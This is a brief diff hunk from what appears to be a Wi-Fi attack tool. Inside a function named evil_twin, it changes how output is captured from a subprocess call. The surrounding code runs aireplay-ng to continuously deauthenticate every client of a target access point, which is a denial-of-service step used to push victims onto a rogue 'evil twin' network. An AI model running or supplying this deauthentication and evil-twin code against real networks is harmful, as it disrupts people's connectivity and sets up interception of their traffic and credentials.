@@ -1306,7 +1306,7 @@ def evil_twin(target_ap, twin_mode):
                          try:
                               # Continuosly deauth deauth all clients
                               command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
-                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=None)
+                              subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                          except:
                               pass
 
